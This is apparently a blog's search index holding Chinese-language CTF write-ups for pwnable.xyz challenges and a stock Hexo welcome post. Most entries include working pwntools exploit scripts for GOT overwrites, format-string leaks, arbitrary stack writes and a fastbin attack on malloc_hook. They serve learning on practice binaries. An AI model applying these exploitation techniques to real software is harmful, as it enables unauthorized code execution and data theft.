alt="markdown"></li><li>但是此时我们的ptr指向的是0x1000的chunk而非那个被放入unsorted bin的原top chunk，因此下一步便是再申请一个chunk 这样就会从那个unsorted bin 中切割出来chunk 依旧可以获得一个偏移固定的main_arena地址，效果如下，bk指针偏移量固定，main_arena + 1640<br><img src="https://i.loli.net/2019/10/19/dwbAm9cphxYESUK.png" alt="markdown"></li><li>在这之后，我们可以使用show()来获取main_arena的地址，进而获取libc的基址</li></ul></blockquote><h4 id="获取libc基地址"><a href="#获取libc基地址" class="headerlink" title="获取libc基地址"></a>获取libc基地址</h4><ul><li>就是bk中地址 - 1640 - libc基地址 = 固定偏移量</li><li>即0x7f554a5a7188 - 1640 - 0x7f554a1e2000 = 0x3C4B20<br><img src="https://i.loli.net/2019/10/19/JqeTnbKR1fSLBHi.png" alt="markdown"></li><li>综上，show()函数接受到的地址，再-1640 -0x3C4B20 就是基地址了<h4 id="获取malloc-hook"><a href="#获取malloc-hook" class="headerlink" title="获取malloc_hook"></a>获取malloc_hook</h4></li><li>malloc_hook的位置就在main_arena地址上方0x10，即偏移量0x3C4B10<h4 id="获得libc基址之后"><a href="#获得libc基址之后" class="headerlink" title="获得libc基址之后"></a>获得libc基址之后</h4></li><li>因为在delete()之后指针并未置0，因此可以通过UAF + fast_bin_attack来修改malloc_hook为one_gadget的地址</li><li>具体操作是先delete()，然后UAF,修改fd为fake_chunk_addr,再连续malloc两次，获得的就是那个fd的指针<h4 id="fake-chunk获取"><a href="#fake-chunk获取" class="headerlink" title="fake_chunk获取"></a>fake_chunk获取</h4><blockquote><p>find_fake_fast (malloc_hook_addr) (size)<br><img src="https://i.loli.net/2019/10/19/werltWpHa2zKud9.png" alt="markdown"></p></blockquote></li></ul><p>即偏移为离malloc_hook为0x23<br>要修改的fd就是fake_chunk的地址</p><h5 id="注"><a href="#注" class="headerlink" title="注"></a>注</h5><p>当后面两次malloc()获得fake_chunk后，edit的时候偏移是<em>0x23 - 0x10 = 0x13</em> (因为malloc时给的还要加上0x10的prev_size和size)</p><p>最后修改成功后再次malloc即可获得shell</p><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><pre><code class="python">#encoding:utf-8from pwn import *from LibcSearcher import LibcSearchersh = process(&#39;./snote&#39;)#sh = remote(&#39;55fca716.gamectf.com&#39;,37009)main_arena_offset = 1640offset_base = 0x3c4b20malloc_hook_offset = 0x3C4B10context.log_level = &#39;DEBUG&#39;def add(size,content):    sh.sendline(&#39;1&#39;)    sleep(0.5)    sh.sendlineafter(&#39;Size &gt; &#39;,str(size))    sh.sendlineafter(&#39;Content &gt; &#39;,content)    sh.recvuntil(&#39;Your choice &gt; &#39;)def delete():    sh.sendline(&#39;3&#39;)    sh.recvuntil(&#39;Your choice &gt;&#39;)def show():    sh.sendline(&#39;2&#39;)    ans = u64(sh.recvuntil(&#39;Done!&#39;)[8:16])    print(&#39;addr =&#39;,ans)    sh.recvuntil(&#39;Your choice &gt;&#39;)    return ansdef edit(size,content):    sh.sendline(&#39;4&#39;)    sleep(0.5)    sh.sendlineafter(&#39;Size &gt;&#39;,str(size))    sh.sendafter(&#39;Content &gt;&#39;,content)    sh.recvuntil(&#39;Your choice &gt;&#39;)sh.sendline(&#39;aaa&#39;)sh.recvuntil(&#39;Your choice &gt; &#39;)add(0x58,&#39;111&#39;) #0gdb.attach(sh)payload = &#39;\x00&#39; * 0x58  +p64(0xfa1)#0xfa1 内存页对齐edit(0x60,payload)add(4096,&#39;&#39;)add(0x60,&#39;&#39;)addr = show()main_arena_addr = addr - main_arena_offsetlibc_base = main_arena_addr - offset_baseone_gedget = libc_base + 0xf02a4malloc_hook = libc_base + malloc_hook_offsetfake_chunk_addr = malloc_hook - 0x23#find_fake_fast 时注意size是0x70 因为chunk头占0x10print(&#39;libc_base = &#39; ,hex(libc_base))print(&#39;main_arena =&#39; ,hex(main_arena_addr))print(&#39;malloc_hook=&#39;, hex(malloc_hook))print(&#39;one_gadget =&#39;,hex(one_gedget))print(&#39;fakechunk = &#39;,hex(fake_chunk_addr))delete()edit(8,p64(fake_chunk_addr))add(0x60,&#39;&#39;)add(0x60,&#39;&#39;)edit(27,&#39;\x00&#39; * 0x13 + p64(one_gedget))sh.sendline(&#39;1&#39;)sleep(0.2)sh.send(&#39;24&#39;)sh.interactive()</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwnable.xyz two targets WriteUp</title>
      <link href="/2019/09/12/twotargets/"/>
      <url>/2019/09/12/twotargets/</url>
      
        <content type="html"><![CDATA[<p>pwnable.xyz 上的two targets的WriteUp。</p><a id="more"></a><h1 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h1><p><img src="https://i.loli.net/2019/09/12/yN2GnJkgAhOiSVU.png" alt="MarkDown"></p><p>顾名思义，two targets，本题有两种做法。</p><h2 id="方法一-GOT覆写"><a href="#方法一-GOT覆写" class="headerlink" title="方法一 : GOT覆写"></a>方法一 : GOT覆写</h2><p><img src="https://i.loli.net/2019/09/12/3oWZYFRrVfyHunv.png" alt="MarkDown"></p><p><img src="https://i.loli.net/2019/09/12/MAsQIB13NypSlze.png" alt="MarkDown"></p><p>由于v7 v8之间距离为0x10 = 16 ，而scanf往<code>&amp;v7</code>中读入的有24字节，因此可以先选择输入2，覆写</p><p><code>v8</code>中存储的地址，然后输入3，达到任意写的目的。又因为并没有开启FULL RELRO保护，所以可以GOT覆写。</p><p><img src="https://i.loli.net/2019/09/12/Dqhrd3jSLR4lgvb.png" alt="MarkDown"></p><p><em>注意</em> </p><p>因为往v8中读入的scanf()是%d 因此win()函数的地址需要转化成10进制输入0x40099c = 4196764</p><h3 id="方法一-EXP"><a href="#方法一-EXP" class="headerlink" title="方法一 EXP"></a>方法一 EXP</h3><pre><code class="python">#coding:utf-8from pwn import *context.log_level = &#39;DEBUG&#39;#sh = process(&#39;./challenge&#39;)sh = remote(&#39;svc.pwnable.xyz&#39;,30031)elf = ELF(&#39;./challenge&#39;)#puts_got = elf.got[&#39;puts&#39;]#got覆写，如果选择覆写puts()则会报错，原因不明strcmp_got = elf.got[&#39;strncmp&#39;]#print(puts_got)flag =     0x40099Cpayload = &#39;A&#39; * 16 + p64(strcmp_got)#sh.recvuntil(&#39;&gt; &#39;)sh.sendlineafter(&#39;&gt; &#39;,&#39;2&#39;)#sh.recvuntil(&#39;: &#39;)#gdb.attach(sh)sh.sendafter(&#39;: &#39;,payload)print(payload)#sh.recvuntil(&#39;&gt; &#39;)sh.sendlineafter(&#39;&gt; &#39;,&#39;3&#39;)payload = &#39;4196764&#39;#sh.recvuntil(&#39;: &#39;)sh.sendlineafter(&#39;: &#39;,payload)#sh.recvuntil(&#39;&gt; &#39;)#gdb.attach(sh)sh.sendlineafter(&#39;&gt; &#39;,&#39;4&#39;)sh.interactive()</code></pre><h2 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h2><p>方法二即按照题目思路，通过满足auth()函数的条件获得flag。</p><p><img src="https://i.loli.net/2019/09/12/l8hpWe6RCquALSj.png" alt="MarkDown"></p><p><code>s2</code>是全局变量 </p><p><img src="https://i.loli.net/2019/09/12/Cbcpi2Y1nhokurI.png" alt="MarkDown"></p><p>main() 即从<code>0x400B04</code> 到 <code>0x400B23</code>的内容</p><p><img src="https://i.loli.net/2019/09/12/mrv7etdOAulVYwk.png" alt="MarkDown"></p><p><em>注意</em></p><p>看auth()的运算式时一定要仔细，我就因为括号顺序看错直接整个式子就错了。是左边<code>a1[i]</code>经过运算之后再和<code>main[i]</code>异或得到<code>s2[i]</code>的值。</p><h3 id="方法二-EXP"><a href="#方法二-EXP" class="headerlink" title="方法二 EXP"></a>方法二 EXP</h3><pre><code class="python">#encoding:utf-8main = &#39;55 48 89 E5 48 83 EC 50 64 48 8B 04 25 28 00 00 00 48 89 45 F8 31 C0 E8 24 FE FF FF 48 8D 45 C0&#39;.split(&#39; &#39;)s2   = &#39;11 DE CF 10 DF 75 BB A5 43 1E 9D C2 E3 BF F5 D6 96 7F BE B0 BF B7 96 1D A8 BB 0A D9 BF C9 0D FF&#39;.split(&#39; &#39;)#print(main)#print(s2)result = []for i in range(32):    result.append( int(main[i],16) ^ int(s2[i],16) )ans = &#39;&#39;for i in range(32):    for j in range(256):        if(((j &gt;&gt; 4) | ( (16 * j) &amp; 0xff ) ) == result[i] ):            ans += chr(j)#特别注意： (16*j)需要 &amp; 0xff,因为16*j的结果很容易就&gt;256 之后结果一定不正确print(ans)from pwn import *context.log_level = &#39;DEBUG&#39;#sh = process(&#39;./challenge&#39;)sh = remote(&#39;svc.pwnable.xyz&#39;,30031)sh.sendlineafter(&#39;&gt; &#39;,&#39;1&#39;)sh.sendlineafter(&#39;: &#39;,ans)sh.sendlineafter(&#39;&gt; &#39;,&#39;4&#39;)sh.interactive()</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwnable.xyz Note WriteUp</title>
      <link href="/2019/09/12/note/"/>
      <url>/2019/09/12/note/</url>
      
        <content type="html"><![CDATA[<p>pwnable.xyz 上的Note的WriteUp。</p><a id="more"></a><h1 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h1><p><img src="https://i.loli.net/2019/09/12/DepwVgEmMrjNcnC.png" alt="MarkDown"></p><p><img src="https://i.loli.net/2019/09/12/C1gbnhT5GUlcfPj.png" alt="MarkDown"></p><p><img src="https://i.loli.net/2019/09/12/ykEMC2G7xQbXTpH.png" alt="MarkDown"></p><p><img src="https://i.loli.net/2019/09/12/dQTXpF9oxqCBIz2.png" alt="MarkDown"></p><p>目标是触发win()函数。注意到，输入1进入的<code>edit_note()</code>函数可对全局变量<code>s</code>进行任意长度写，其中buf和s的距离是0x20，而输入2进入的 <code>edit_desc()</code>函数是从标准输入流写入<code>buf</code>内容所指的地址中，由此可以通过先输入1，将buf中内容覆写，再输入2，达到任意地址写的目的。</p><p>还有一点，因为该程序并未开启RELRO保护，因此可以进行GOT表覆写.</p><p><img src="https://i.loli.net/2019/09/12/lHm18kxzP2QNUcO.png" alt="MarkDown"></p><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><pre><code class="python">from pwn import *context.log_level = &#39;DEBUG&#39;flag = 0x40093celf = ELF(&#39;./challenge&#39;)puts_got = elf.got[&#39;puts&#39;]print(hex(puts_got))#puts_got = 0x601220sh = process(&#39;./challenge&#39;)#sh = remote(&#39;svc.pwnable.xyz&#39;,30016)sh.recvuntil(&#39;&gt; &#39;)payload = &#39;A&#39; * 32 + p64(puts_got)sh.sendline(&#39;1&#39;)sh.recvuntil(&#39;? &#39;)sh.sendline(&#39;52&#39;)sh.recvuntil(&#39;note: &#39;)sh.sendline(payload)sh.recvuntil(&#39;&gt; &#39;)sh.sendline(&#39;2&#39;)sh.recvuntil(&#39;desc: &#39;)sh.sendline(p64(flag))sh.recvuntil(&#39;&gt; &#39;)sh.sendline(&#39;123&#39;)sh.interactive()</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwnable.xyz misalignment WriteUp</title>
      <link href="/2019/09/12/misaligment/"/>
      <url>/2019/09/12/misaligment/</url>
      
        <content type="html"><![CDATA[<p>pwnable.xyz 上的misalignment的WriteUp。</p><a id="more"></a><h1 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h1><p><img src="https://i.loli.net/2019/09/12/N7duFq2lIhxyGz8.png" alt="MarkDown"></p><p>目标很明确，使v5+7 == 0xB000000B5即可获得flag。</p><p><em>注意</em></p><ol><li><p>v6/v7/v8 是int64，占8字节，因此通过每次输入v8只能控制 <code>v5 - v5+7</code>  ,<code>v5+8 - v5+15</code>这两个范围的内容中的一个，因此需要分两次输入。</p></li><li><p>因为是小端序，因此从v5 + 7一直到 v5 + 14 中的值应该按次序为0xB5,0x00,0x00,0x00,0x0B,0x00,0x00,0x00.</p></li></ol><p>由此可得，第一次v8 = -6时，v6+v7应该 = 0xB500000000000000 特别地，因为刚好8字节，符号位又为1，因此输入的值应该为<code>-5404319552844595200</code>（从计算器中可得）</p><p><img src="https://i.loli.net/2019/09/12/6mIfwGd7FOVAqYx.png" alt="MarkDown"></p><p>同理，第二次v8 = -5 ，输入的值就是0x0B000000 = 184549376</p><p>运行脚本即可得flag。</p><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><pre><code class="python">from pwn import *context.log_level = &#39;DEBUG&#39;#sh = process(&#39;./challenge&#39;)sh = remote(&#39;svc.pwnable.xyz&#39;,30003)#sh.recv()#gdb.attach(sh)sh.sendline(&#39;-5404319552844595200 0 -6&#39;)sh.sendline(&#39;184549376 0 -5&#39;)sh.interactive()</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwnable.xyz GrownUp WriteUp</title>
      <link href="/2019/09/12/grownup/"/>
      <url>/2019/09/12/grownup/</url>
      
        <content type="html"><![CDATA[<p>pwnable.xyz 上的GrownUp的WriteUp。</p><a id="more"></a><h1 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h1><p><img src="https://i.loli.net/2019/09/12/wQjiYqFezdTZ35o.png" alt="Markdown"></p><p>一开始，先用shift+F12发现flag字符串，赶忙提交后发现不对</p><p><img src="https://i.loli.net/2019/09/12/5YvpDJyMcxkes3a.png" alt="Markdown"></p><p>实际上是提示了我们服务器端的flag地址是0x601080</p><p>开始正经做题，似乎难以下手，但是注意到<code>printf(qword_601160, usr)</code>这一行可能有格式化字符串漏洞。</p><p>在gdb中发现<code>qword_601160</code>的值为0x601168</p><p><img src="https://i.loli.net/2019/09/12/pOMIb1GfBEog3FQ.png" alt="Markdown"></p><p>而<code>qword_601160</code>和<code>usr</code>的距离是0x80 = 128</p><pre><code>read(0, src, 0x80uLL)strcpy(usr, src);</code></pre><p>这两行乍一看也没有问题</p><p><em>关键</em>  ：strcpy()函数会在复制结束后在目标字符串后添加结束符<code>/x00</code> ；read()则不会。</p><p>由此，如果我们恰好对src输入128个字符，这样最后一个被添加到末尾的<code>/x00</code>就会溢出到0x601160，并且由于小端序，会覆盖原来的<code>/x68</code>，这样qword_601160的值就会被改为0x601100，是usr+32的地址，我们就可以利用格式化字符串漏洞泄露栈中内容了。如果我们之前曾经把flag的地址输入栈中，那么我们就可以用<code>%s</code>将其输出.</p><pre><code class="python">from pwn import * context.log_level = &#39;DEBUG&#39;sh = process(&#39;./GrownUpRedist&#39;)flag = 0x601080payload = &#39;&#39;payload += &#39;y&#39; * 8 + p64(flag)sh.recvuntil(&#39;Are you 18 years or older? [y/N]: &#39;)sh.send(payload)payload = &#39;&#39;payload = &#39;A&#39; * 32 + &#39;%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p &#39;length = len(payload)payload += &#39;A&#39; * (128 - length)sh.recvuntil(&#39;Name: &#39;)sh.sendline(payload)print(sh.recvall())sh.interactive()</code></pre><p>在试运行时发现</p><p><img src="https://i.loli.net/2019/09/12/w6KPeLyriD2tmOV.png" alt="Markdown"></p><p>第九个泄露的地址为flag地址0x601080，因此将脚本中的对应位置修改为<code>%s</code>即可得flag。</p><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><pre><code class="python">#encoding:utf-8from pwn import * context.log_level = &#39;DEBUG&#39;#sh = process(&#39;./GrownUpRedist&#39;)sh = remote(&#39;svc.pwnable.xyz&#39;,30004)flag = 0x601080payload = &#39;&#39;payload += &#39;y&#39; * 8 + p64(flag)sh.recvuntil(&#39;Are you 18 years or older? [y/N]: &#39;)sh.send(payload)#这里如果是sendline()就会报错 原因不明payload = &#39;&#39;payload = &#39;A&#39; * 32 + &#39;%p,%p,%p,%p,%p,%p,%p,%p,%s,%p,%p,%p,%p,%p,%p &#39;#第九个位置如果用%p可以见到0x601080 就是flag的地址了 之后改成%s输出flaglength = len(payload)payload += &#39;A&#39; * (128 - length)#payload.ljust(128,&#39;A&#39;)#print(payload)sh.recvuntil(&#39;Name: &#39;)sh.sendline(payload)print(sh.recvall())sh.interactive()</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwnable.xyz add WriteUP</title>
      <link href="/2019/08/08/add/"/>
      <url>/2019/08/08/add/</url>
      
        <content type="html"><![CDATA[<p>pwnable.xyz 上的add的WriteUP。</p><a id="more"></a><h1 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h1><p><img src="http://i2.tiimg.com/696456/0f3701a7745115c4.png" alt="Markdown"></p><p>依旧是拖进IDA</p><p><img src="http://i2.tiimg.com/696456/745835338a81ed4f.png" alt="Markdown"></p><p><img src="http://i2.tiimg.com/696456/6cef7378623e6976.png" alt="Markdown"></p><p>注意到<code>win()</code>函数可获得flag，地址为0x400822 == 4196386。而<code>v7[v6] = v4 + v5</code>这一步可以任意覆写栈上内容，只要利用这个修改位于<code>rbp + 8</code>的ret地址，然后在第二次while循环时输入任意非数字字符使得<code>scanf()</code>返回值 != 3，在return时就可cat /flag 。</p><h2 id="计算"><a href="#计算" class="headerlink" title="计算"></a>计算</h2><p> v7 = rbp - 60h ; ret地址 = rbp + 8h ; 因此距离为0x68 = 104。值得注意的是v7数组类型是 <em>int64</em> ，占8个字节，所以 v6应该等于 104 / 8 == 13。  </p><p>另一边，v4 + v5 = win()函数的入口地址 = 4196386d即可。</p><h3 id="最终输入"><a href="#最终输入" class="headerlink" title="最终输入"></a>最终输入</h3><p>依旧不用写EXP</p><p>第一次循环 v4 = 4196385 v5 = 1 v6 =13</p><p>第二次循环，随便打个字母就行。</p>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwnable.xyz sub WriteUp</title>
      <link href="/2019/08/08/sub/"/>
      <url>/2019/08/08/sub/</url>
      
        <content type="html"><![CDATA[<p> pwnable.xyz上的白给题的wp。</p><a id="more"></a><h1 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h1><p><img src="http://i2.tiimg.com/696456/4df890822636f8f2.png" alt="Markdown">  </p><p>直接拖进IDA:</p><p><img src="http://i2.tiimg.com/696456/ae51a0863b07f649.png" alt="Markdown"></p><p>只要满足v4 - v5 == 4919即可。所以v4=4918，v5=-1就行了，连EXP都不用写。</p>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwnable.xyz welcome WriteUp</title>
      <link href="/2019/08/07/pwnable-xyz-welcome-WriteUp/"/>
      <url>/2019/08/07/pwnable-xyz-welcome-WriteUp/</url>
      
        <content type="html"><![CDATA[<p>开始做pwnable.xyz上的题目了，记录下做题的思路。</p><a id="more"></a><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p><img src="http://i1.fuimg.com/696456/119eebdc5119a96f.png" alt="Markdown"></p><p>​        </p><p>​    下载后解压，试运行：</p><p><img src="http://i1.fuimg.com/696456/12e8d4e4025934aa.png" alt="Markdown"></p><p>​    拖进IDA中查看源码:  </p><p><img src="http://i1.fuimg.com/696456/186e0c53b922e2b4.png" alt="Markdown"></p><p>发现Leak给出的是v3的地址，而题目的目的是要将<code>*v3</code>的值改为<code>0</code>，这将会是一个突破口。在一开始我以为<code>malloc()</code>函数申请的两个空间是连续的，但在gdb中运行后发现并不如此。  </p><p><strong>关键点</strong></p><ol><li><p><code>malloc()</code>函数在申请空间失败时返回<code>NULL</code> ,且NULL == 0.</p></li><li><p><code>v5[size - 1]</code> == <code>*(v5 + (size-1) * sizeof(char) )</code>  </p></li></ol><p>因此当我们使得<code>malloc()</code>函数分配空间失败时，v5 == 0 ，就可以实现对<code>hex(size-1)</code>地址的赋值为0操作，即可获得flag。  </p><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><pre><code>from pwn import *sh = remote(&quot;svc.pwnable.xyz&quot;,30000)sh.recvuntil(&quot;Leak:&quot;)leak = sh.recvline()#print(leak)payload = str(int(leak,16) + 1)#print(payload)sh.recvuntil(&quot;Length of your message: &quot;)sh.sendline(payload)sh.recv()sh.sendline(&quot; &quot;)print(sh.recv())</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2019/08/03/hello-world/"/>
      <url>/2019/08/03/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p><a id="more"></a><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><pre><code class="bash">$ hexo new &quot;My New Post&quot;</code></pre><p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><pre><code class="bash">$ hexo server</code></pre><p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><pre><code class="bash">$ hexo generate</code></pre><p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><pre><code class="bash">$ hexo deploy</code></pre><p>More info: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="noopener">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
